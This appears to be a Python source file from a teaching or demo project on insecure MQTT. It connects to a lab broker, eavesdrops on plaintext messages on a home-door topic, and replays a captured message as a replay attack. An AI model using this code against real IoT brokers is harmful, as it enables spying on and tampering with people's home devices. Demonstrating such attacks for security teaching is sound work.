# src/insecure/attacker.py
"""
ATTACKER - Demonstrates attacks against insecure MQTT communication.
"""
import sys
import os
import json
import time
import uuid
from datetime import datetime

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from common.mq_helpers import connect_client, subscribe_topic, publish_message, disconnect_client
from common.logger import get_logger

logger = get_logger("attacker_insecure")

# ============================================================
# Use mqtt-broker inside Docker
# ============================================================
BROKER_HOST = os.getenv("MQTT_BROKER", "mqtt-broker")
BROKER_PORT = int(os.getenv("MQTT_PORT", "1883"))

CLIENT_ID = "attacker_insecure"
TARGET_TOPIC = "home/door"


class InsecureAttacker:
    """Demonstrates attacks on insecure MQTT."""

    def __init__(self, broker_host, broker_port):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.client = None
        self.captured_messages = []

    def connect(self):
        logger.info("Attacker connecting to broker", extra={
            "extra_data": {
                "broker": self.broker_host,
                "port": self.broker_port,
                "attack_mode": "ACTIVE"
            }
        })

        self.client = connect_client(
            CLIENT_ID,
            host=self.broker_host,
            port=self.broker_port,
            on_message=self.on_message
        )

    def on_message(self, client, userdata, msg):
        """Captures messages without encryption."""
        try:
            payload = msg.payload.decode()
            logger.info(" Captured message", extra={
                "extra_data": {
                    "topic": msg.topic,
                    "payload": payload
                }
            })
            self.captured_messages.append(payload)

        except Exception as e:
            logger.error(f"Error processing message: {e}")

    def replay_attack(self):
        """Replays the last captured message."""
        if not self.captured_messages:
            logger.warning(" No messages captured — cannot replay")
            return

        message = self.captured_messages[-1]
        logger.info("Replaying captured message...", extra={
            "extra_data": {"replayed_payload": message}
        })

        publish_message(self.client, TARGET_TOPIC, message)

    def run(self):
        """Main attacker routine."""
        self.connect()
        subscribe_topic(self.client, TARGET_TOPIC)

        logger.info(" Attacker is listening for messages...")

        # Wait to capture a few messages
        time.sleep(8)

        # Perform replay attack
        logger.info("Launching replay attack!")
        self.replay_attack()

        # Keep attacker alive to capture more traffic
        while True:
            time.sleep(2)


def main():
    attacker = InsecureAttacker(BROKER_HOST, BROKER_PORT)
    attacker.run()


if __name__ == "__main__":
    main()
